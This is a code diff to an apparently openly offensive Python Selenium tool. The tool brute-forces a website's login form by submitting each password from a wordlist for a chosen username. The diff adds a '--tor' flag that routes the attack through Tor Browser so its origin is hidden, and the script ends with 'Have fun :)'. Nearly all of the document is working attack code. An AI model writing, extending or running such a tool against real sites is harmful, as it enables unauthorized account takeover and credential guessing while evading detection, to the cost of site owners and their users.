@@ -13,11 +13,16 @@ from selenium.common.exceptions import NoSuchElementException
 
 from cosmetic import banner, color
 
-
+from tbselenium.tbdriver import TorBrowserDriver
+from tbselenium.utils import start_xvfb, stop_xvfb
+from tbselenium.utils import launch_tbb_tor_with_stem
+from tbselenium.common import STEM_SOCKS_PORT, USE_RUNNING_TOR,\
+    STEM_CONTROL_PORT
 
 #Config#
 parser = OptionParser()
 now = datetime.datetime.now()
+tbb_path = '/home/mok/.tor-browser-en/INSTALL'
 
 
 #Args
@@ -27,12 +32,13 @@ parser.add_option("--passsel", dest="passsel",help="Choose the password selector
 parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
 parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
 parser.add_option("--website", dest="website",help="choose a website")
+parser.add_option("--tor", dest="tor", action="store_true", help="To conduct the attack through Tor")
 (options, args) = parser.parse_args()
 
 
 
 
-def wizard():
+def wizard(use_tor=False):
     print (banner)
     website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
     print(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists ', flush=True),
@@ -57,16 +63,21 @@ def wizard():
     password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
     login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
     username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
-    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
-    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+    passlist = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
+    if use_tor:
+        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True)
+    else:
+        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website)
 
-def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
-    f = open(pass_list, 'r')
-    driver = webdriver.Chrome()
-    optionss = webdriver.ChromeOptions()
-    optionss.add_argument("--disable-popup-blocking")
-    optionss.add_argument("--disable-extensions")
-    browser = webdriver.Chrome(chrome_options=optionss)
+def brutes(username, username_selector, password_selector, login_btn_selector, passlist, website, use_tor=False):
+    f = open(passlist, 'r')
+    if use_tor:
+        browser = TorBrowserDriver(tbb_path)
+    else:
+        optionss = webdriver.ChromeOptions()
+        optionss.add_argument("--disable-popup-blocking")
+        optionss.add_argument("--disable-extensions")
+        browser = webdriver.Chrome(chrome_options=optionss)
     while True:
         try:
             for line in f:
@@ -75,8 +86,6 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                 Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                 enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
-                # browser.find_element_by_css_selector(password_selector).clear()
-                # browser.find_element_by_css_selector(username_selector).clear()
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
                 print('------------------------')
@@ -91,25 +100,29 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
             print(color.YELLOW + 'Have fun :)')
             exit()
 
-
-
-if options.username == None:
-    if options.usernamesel == None:
-        if options.passsel == None:
-            if options.loginsel == None:
-                if options.passlist == None:
-                    if options.website == None:
-                        wizard()
-
-
 username = options.username
 username_selector = options.usernamesel
 password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
-pass_list = options.passlist
-print(banner)
-brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+passlist = options.passlist
 
+if not (username and \
+        username_selector and \
+        password_selector and \
+        login_btn_selector and \
+        website and \
+        passlist):
+    if options.tor:
+        wizard(use_tor=True)
+    else:
+        wizard()
+
+
+print(banner)
+if options.tor:
+    brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True)
+else:
+    brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website)
 
 
